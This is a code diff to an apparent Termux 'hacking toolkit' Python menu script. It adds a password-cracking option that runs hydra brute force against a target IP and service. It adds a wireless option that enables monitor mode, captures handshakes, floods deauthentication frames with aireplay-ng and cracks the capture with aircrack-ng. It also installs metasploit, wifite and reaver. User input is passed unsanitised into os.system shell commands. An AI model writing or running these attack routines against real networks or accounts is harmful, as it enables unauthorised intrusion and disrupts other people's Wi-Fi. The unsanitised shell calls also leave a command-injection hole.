@@ -2,19 +2,25 @@ import os
 import requests
 from scapy.all import *
 from geopy.geocoders import Nominatim
-import nmap
 
 def install_dependencies():
     print("Installing dependencies...")
     os.system("pkg update && pkg upgrade -y")
     os.system("pkg install python git nmap termux-api tsu wget curl openssh figlet toilet hydra metasploit wireshark aircrack-ng reaver wifite whois dnsutils net-tools iw -y")
-    os.system("pip install requests scapy geopy")
+    os.system("pip install requests scapy geopy nmap")
 
 def wifi_scan():
     print("Scanning for Wi-Fi networks...")
     os.system("termux-wifi-scaninfo")
 
 def network_scan():
+    try:
+        import nmap
+    except ImportError:
+        print("nmap module not found. Installing...")
+        os.system("pip install nmap")
+        import nmap
+
     nm = nmap.PortScanner()
     target = input("Enter the target IP address or network (e.g., 192.168.1.1/24): ")
     nm.scan(target)
@@ -52,7 +58,27 @@ def weather_information():
         print("City Not Found!")
 
 def rfid_scan():
-    print("RFID scanning is not supported directly in Termux without additional hardware and software support.")
+    print("Scanning for RFID/NFC tags...")
+    os.system("termux-nfc")
+
+def password_crack():
+    target = input("Enter the target IP: ")
+    service = input("Enter the service (e.g., ssh, ftp): ")
+    username = input("Enter the username: ")
+    wordlist = input("Enter the path to the wordlist: ")
+    os.system(f"hydra -l {username} -P {wordlist} {service}://{target}")
+
+def wireless_security():
+    os.system("airmon-ng start wlan0")
+    os.system("airodump-ng wlan0mon")
+    bssid = input("Enter the BSSID of the target: ")
+    channel = input("Enter the channel of the target: ")
+    os.system(f"airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon")
+    os.system(f"aireplay-ng --deauth 0 -a {bssid} wlan0mon")
+    os.system("aircrack-ng -w wordlist.txt capture*.cap")
+
+def bluetooth_scan():
+    os.system("termux-bluetooth-scan")
 
 def menu():
     while True:
@@ -62,8 +88,11 @@ def menu():
         print("3. Network Scanner")
         print("4. Geolocation")
         print("5. Weather Information")
-        print("6. RFID Scanner (limited support)")
-        print("7. Exit")
+        print("6. RFID/NFC Scanner")
+        print("7. Password Cracking")
+        print("8. Wireless Security")
+        print("9. Bluetooth Scanner")
+        print("10. Exit")
         
         choice = input("Enter your choice: ")
         
@@ -80,6 +109,12 @@ def menu():
         elif choice == '6':
             rfid_scan()
         elif choice == '7':
+            password_crack()
+        elif choice == '8':
+            wireless_security()
+        elif choice == '9':
+            bluetooth_scan()
+        elif choice == '10':
             break
         else:
             print("Invalid choice. Please try again.")
